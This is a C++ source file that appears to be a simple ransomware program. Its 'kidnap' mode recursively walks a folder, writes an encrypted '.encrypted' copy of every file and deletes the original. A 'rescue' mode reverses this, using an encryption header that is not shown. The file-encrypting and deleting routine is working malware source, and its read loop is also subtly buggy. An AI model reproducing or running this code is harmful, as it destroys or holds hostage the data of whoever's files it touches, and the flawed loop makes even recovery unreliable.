#include <sys/types.h>
#include <sys/stat.h>
#include <iostream>
#include <fstream>
#include <experimental/filesystem>
#include <string>
#include <dirent.h>
#include <errno.h>

#include "encryption.hpp"
#include "futil.hpp"

using namespace std;

/**
 * Create en encrypted (.encrypt) copy of the given file
 **/
void encrypt_file(string path)
{

    fstream in = std::fstream(path, ios::in | ios::binary);
    ofstream out = std::ofstream(path + ".encrypted", ios::out | ios::trunc);

    while (!in.eof())
    {
        uint32_t word;
        in.read(reinterpret_cast<char *>(&word), 4);
        word = encrypt(word);
        out.write(reinterpret_cast<char *>(&word), 4);
    }
}

/**
 * Create a decrypted copy of the given file
 **/
void decrypt_file(string path) {

    fstream in = std::fstream(path, ios::in | ios::binary);
    ofstream out = std::ofstream(path.substr(0, path.length() - 10), ios::out | ios::trunc);

    while (!in.eof())
    {
        uint32_t word;
        in.read(reinterpret_cast<char *>(&word), 4);
        word = decrypt(word);
        out.write(reinterpret_cast<char *>(&word), 4);
    }

}

/**
 * Encrypt the file and remove the original file
 **/
void kidnap_file(string path)
{
    encrypt_file(path);
    remove(path.c_str());
}

/**
 * Decrypt the file and remove the encrypted copy
 **/
void rescue_file(string path) {
    decrypt_file(path);
    remove(path.c_str());
}

/**
 * Encrypt all files of a folder recursively
 **/
void kidnap_folder(string path, int depth) {
    vector<string> files = vector<string>(), folders = vector<string>();
    getdir(path, files, folders);

    string s(depth * 2, ' ');
    string current_dir = path;

    cout << s << "+ Folder: " << current_dir << endl;
    for (auto &file_name : files) {
        cout << s << "  - Kidnaping: " << file_name << endl;
        kidnap_file(file_name);        
    }

    for (auto &folder_name : folders)
        kidnap_folder(folder_name, depth + 1);

}

/**
 * Descrypt all files of a folder recursively
 **/
void rescue_folder(string path, int depth) {

    vector<string> files = vector<string>(), folders = vector<string>();
    getdir(path, files, folders);

    string s(depth * 2, ' ');
    string current_dir = path;

    cout << s << "+ Folder: " << current_dir << endl;
    for (auto &file_name : files) {
        cout << s << "  - Rescuing: " << file_name << endl;
        rescue_file(file_name);        
    }

    for (auto &folder_name : folders)
        rescue_folder(folder_name, depth + 1);

}

int main(int argc, char** argv) {
    string mode = string(argv[1]), folder_name = string(argv[2]);
    if (mode == "kidnap") kidnap_folder(folder_name, 0);    
    else if (mode == "rescue") rescue_folder(folder_name, 0);
    return 0;
}
